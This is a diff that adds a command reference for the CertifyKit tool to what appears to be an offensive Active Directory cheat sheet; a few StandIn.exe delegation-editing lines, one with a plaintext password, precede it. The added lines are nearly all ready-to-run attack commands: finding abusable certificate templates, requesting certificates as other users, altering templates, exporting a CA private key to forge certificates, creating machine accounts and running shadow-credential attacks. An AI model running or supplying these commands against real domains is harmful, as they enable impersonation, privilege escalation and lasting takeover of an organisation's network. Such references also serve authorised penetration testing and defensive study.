@@ -256,3 +256,179 @@ StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543
 # Remove msDS-AllowedToActOnBehalfOfOtherIdentity from machine object properties
 StandIn.exe --computer Miskatonic --remove
 StandIn.exe --computer Miskatonic --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4
+
+## CertifyKit Commands
+
+### Find Information About All Registered CAs
+
+```powershell
+CertifyKit.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]
+```
+
+### Find All Enabled Certificate Templates
+
+```powershell
+CertifyKit.exe find [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+```
+
+### Find Vulnerable/Abusable Certificate Templates Using Default Low-Privileged Groups
+
+```powershell
+CertifyKit.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+```
+
+### Find Vulnerable/Abusable Certificate Templates Using All Groups the Current User Context is a Part Of
+
+```powershell
+CertifyKit.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+```
+
+### Find Enabled Certificate Templates Where ENROLLEE_SUPPLIES_SUBJECT is Enabled
+
+```powershell
+CertifyKit.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+```
+
+### Find Enabled Certificate Templates Capable of Client Authentication
+
+```powershell
+CertifyKit.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+```
+
+### Find All Enabled Certificate Templates, Display All of Their Permissions, and Don't Display the Banner Message
+
+```powershell
+CertifyKit.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
+```
+
+### Find All Enabled Certificate Templates and Output to a JSON File
+
+```powershell
+CertifyKit.exe find /json /log:C:\temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
+```
+
+### Enumerate Access Control Information for PKI Objects
+
+```powershell
+CertifyKit.exe pkiobjects [/domain:domain.local | /ldapserver:server.domain.local] [/showAdmins] [/quiet]
+```
+
+### Request a New Certificate Using the Current User Context
+
+```powershell
+CertifyKit.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]
+```
+
+### Request a New Certificate Using the Current Machine Context
+
+```powershell
+CertifyKit.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]
+```
+
+### Request a New Certificate Using the Current User Context but for an Alternate Name (if Supported)
+
+```powershell
+CertifyKit.exe request /ca:SERVER\ca-name /template:Y /altname:USER
+```
+
+### Request a New Certificate on Behalf of Another User, Using an Enrollment Agent Certificate
+
+```powershell
+CertifyKit.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
+```
+
+### Alter the Template to Smart Card Template and Request a New Certificate for an Alternate Name and Restore the Template to Original State
+
+```powershell
+CertifyKit.exe request /ca:SERVER\ca-name /template:Y /alter /altname:USER
+```
+
+### Download an Already Requested Certificate
+
+```powershell
+CertifyKit.exe download /ca:SERVER\ca-name /id:ID [/install] [/machine]
+```
+
+### Issue a Pending or Deleted Certificate
+
+```powershell
+CertifyKit.exe download /ca:SERVER\ca-name /issue /id:ID
+```
+
+### List All Certificates in Store My, CurrentUser by Default or in a Folder Recursively
+
+```powershell
+CertifyKit.exe list [/storename:X | /storelocation:Y | /certificate:C:\Users\] [/password:CERT_PASSWORD] [/recurse]
+```
+
+### Read a Certificate Specifying Thumbprint or File or Base64 String with Password and Export as File or Base64 String with a Password
+
+```powershell
+CertifyKit.exe list /certificate:THUMBPRINT/FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD /encpass:ENC_PASSWORD
+```
+
+### Import a Certificate from File or Base64 String with Password to Store My, CurrentUser by Default
+
+```powershell
+CertifyKit.exe list /certificate:FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD [/storename:X | /storelocation:Y]
+```
+
+### Build Chain of a Certificate from Store My, CurrentUser by Default Specifying Thumbprint
+
+```powershell
+CertifyKit.exe list /certificate:THUMBPRINT [/storename:X | /storelocation:Y] /chain
+```
+
+### Remove a Certificate from Store My, CurrentUser by Default Specifying Thumbprint
+
+```powershell
+CertifyKit.exe list /certificate:THUMBPRINT /remove [/storename:X | /storelocation:Y]
+```
+
+### Backup Private Key for a Certificate Authority's CA Certificate on CA Server, Which Could Be Used to Forge AD CS Certificate
+
+```powershell
+CertifyKit list /golden [/outfile:C:\backup.pfx | /base64] [/encpass:ENC_PASSWORD]
+```
+
+### Create or Remove a Machine Account
+
+```powershell
+CertifyKit account /machine:MACHINE [/createpc | /removepc] [/domain:domain.local | /ldapserver:server.domain.local]
+```
+
+### Alter dNSHostName of a Machine Account or Alter userPrincipalName of a User/Machine Account or Clear userPrincipalName of a User Account
+
+```powershell
+CertifyKit account [/machine:MACHINE | /user:USER] [/dns:new.domain.local | /upn:new@domain.local] [clear]
+```
+
+### Alter or Query Attribute of an Account
+
+```powershell
+CertifyKit account [/machine:MACHINE | /user:USER] /attribute:ATTRIBUTE [/query | /value:VALUE | /clear | /remove:ID] [/append]
+```
+
+### Shadow Credential Attack on a Machine Account and Output Self Signed Certificate as Base64 String by Default
+
+```powershell
+CertifyKit account /machine:MACHINE /shadow [/outfile:C:\xxx.pfx | /install] [/encpass:ENC_PASSWORD]
+```
+
+### Query or Remove or Clear KeyCredentialLink on a User Account
+
+```powershell
+CertifyKit account /user:USER /shadow [/list | /remove:ID | /clear]
+```
+
+### Map a Certificate to a Machine Account for the Purpose of Authentication
+
+```powershell
+CertifyKit account /machine:MACHINE /altsecid /certificate:THUMBPRINT/FILE/BASE64 [/password:CERT_PASSWORD]
+```
+
+### Query or Remove or Clear altSecurityIdentities on a User Account
+
+```powershell
+CertifyKit account /user:USER /altsecid [/list | /remove:ID | /clear]
+```
